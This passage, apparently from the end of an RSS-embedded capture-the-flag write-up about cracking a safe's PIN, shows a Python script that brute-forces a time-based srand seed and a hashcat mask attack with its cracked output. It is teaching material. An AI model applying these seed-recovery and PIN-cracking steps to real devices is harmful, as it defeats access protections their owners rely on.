h &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;lambda&lt;/span&gt; x: hashlib&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sha256(x)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;digest()

START_TIME   &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1605052800&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 2020-11-11 12:00:00 AM -&amp;gt; known date for the software update&lt;/span&gt;
CURRENT_TIME &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1638633346&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 2021-12-04  3:55:46 PM -&amp;gt; current time&lt;/span&gt;
PINCODE      &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4b2e2a1c&lt;/span&gt;

CHARSET      &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1234567890ABCD&amp;#34;&lt;/span&gt;
CHARLEN      &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; len(CHARSET)

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; t &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; tqdm(range(CURRENT_TIME &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; START_TIME)):
    t &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; START_TIME

    libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;srand(t)
    
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; PINCODE &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;rand():

        v8 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;rand() &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xff&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; _ &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;1024&lt;/span&gt;)]
        v8 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; h(bytearray(v8))

        v6 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [CHARSET[v8[i &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; CHARLEN] &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;)]
        v6 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; h(bytearray(v6))

        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Timestamp: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;t&lt;span style=&#34;color:#e6db74&#34;&gt;=}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;, hash: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;v6&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hex()&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And when we found the right seed, we just have to generate, hash, cipher and hash again the right random buffer to get the right hash to which the hash of the pin will be compared to.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;$ python3 solve.py 
 94%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████▏       | 31691218/33580546 &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;01:29&amp;lt;00:05, 351593.81it/s&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
Timestamp: t&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;1636749762, hash: 88c71c0cc0950acfe3835a009f8931cee0f12ab7410538f96d058184a4c90e11
100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 33580546/33580546 &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;01:34&amp;lt;00:00, 356533.87it/s&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;hashcat--profit&#34;&gt;Hashcat + PROFIT&lt;/h2&gt;
&lt;p&gt;Now we know the final hash to which the hash of the pin is compared to, we can just run a mask attack using hashcat with a mask of 8 hexadecimal characters in uppercase (we tried for every length up to the right size: 8).&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ hashcat -a 3 -m 1400 pincode.hash ?H?H?H?H?H?H?H?H
[skip]
88c71c0cc0950acfe3835a009f8931cee0f12ab7410538f96d058184a4c90e11:4233246D

Session..........: hashcat
Status...........: Cracked
Hash.Type........: SHA2-256
Hash.Target......: 88c71c0cc0950acfe3835a009f8931cee0f12ab7410538f96d0...c90e11
Time.Started.....: Sat Dec  5 16:52:37 2021 (7 mins, 22 secs)
Time.Estimated...: Sat Dec  5 16:59:59 2021 (0 secs)
Guess.Mask.......: ?H?H?H?H?H?H?H?H [8]
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  7884.8 kH/s (7.30ms) @ Accel:256 Loops:64 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 3342925824/4294967296 (77.83%)
Rejected.........: 0/3342925824 (0.00%)
Restore.Point....: 816128/1048576 (77.83%)
Restore.Sub.#1...: Salt:0 Amplifier:0-64 Iteration:0-64
Candidates.#1....: 1234515D -&amp;gt; EBCF585D
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The challenge was pretty funny because of the IRL part, and because we solved it together (&lt;a href=&#34;https://github.com/n4sm&#34;&gt;nasm&lt;/a&gt; and &lt;a href=&#34;https://twitter.com/yarienkiva&#34;&gt;Alol&lt;/a&gt;).&lt;/p&gt;
&lt;p&gt;Authors: &lt;a href=&#34;https://github.com/n4sm&#34;&gt;nasm&lt;/a&gt; and &lt;a href=&#34;https://twitter.com/yarienkiva&#34;&gt;Alol&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&#34;annexes&#34;&gt;Annexes&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://ret2school.github.io/images/coffre.jpg&#34; alt=&#34;The safe&#34;&gt;&lt;/p&gt;
- https://clubsecu-esiea.github.io/posts/safe/ - Beerware shit</description>
        </item>
    
    
    
    
  </channel>
</rss> 